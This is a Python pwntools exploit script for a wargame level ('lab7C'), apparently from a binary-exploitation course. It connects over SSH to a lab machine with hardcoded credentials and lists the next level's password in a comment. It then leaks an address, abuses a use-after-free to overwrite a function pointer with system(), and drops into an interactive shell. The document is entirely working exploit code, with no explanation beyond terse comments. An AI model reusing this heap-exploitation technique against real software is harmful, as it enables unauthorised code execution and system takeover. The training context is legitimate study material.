#!/usr/bin/env python3
#
# lab7A:us3_4ft3r_fr33s_4re_s1ck
#

import sys

from pwn import *

def main():

  session = ssh(host="192.168.159.129", user="lab7C", password="lab07start")
  sh = session.process("/bin/sh", env={"PS1":""})

  sh.sendline("/levels/lab07/lab7C")
  sh.read()

  leak = leak_address(sh)
  if (leak < 0x1337):
    exit(-1)

  log.info("Successfully leaked an address: 0x%x" % leak)
  ptr2system = leak-0x19da86
  
  exploit(sh, ptr2system)
  sh.sendline("PWNED")

  if (b"PWNED" in sh.read()):
    log.success("Exploitation complete, enjoy your shell")

  sh.interactive()

# exploit: trigger UAF and overwrite the instruction pointer
def exploit(sh, address):

  sh.sendline("1")                    # make a string - malloc()
  sh.read()

  sh.sendline("/bin/sh;AAAAAAAAAA")
  sh.read()
  
  sh.sendline("3")                    # free() the string
  sh.read()
  
  sh.sendline("2")                    # make a number - malloc()
  sh.read()
  
  sh.sendline("%d" % address)         # overwrite pointer to big_str
  sh.read()
  
  sh.sendline("5")                    # trigger the UAF and call the object / pointer
  sh.read()
  sh.sendline("1") 
 
def leak_address(sh):

  sh.sendline("2")      # make a number - malloc() 
  sh.sendline("A")

  sh.sendline("4")      # delete a number - free()

  sh.sendline("1")      # make a string - malloc()
  sh.sendline("A" * 12)

  sh.sendline("6")      # print a number at index 1
  sh.read()
  sh.sendline("1")
  sh.read()
  leak = sh.read()

  # free() our string, needed to proceed with exploitation
  sh.sendline("3")
  sh.read()

  try:
    leak = int(leak.split(b' ')[3].rstrip(b"\n\n--"))
  except:
    log.failure("Failed to leak address, run again")
    exit(-1)

  return leak

main()
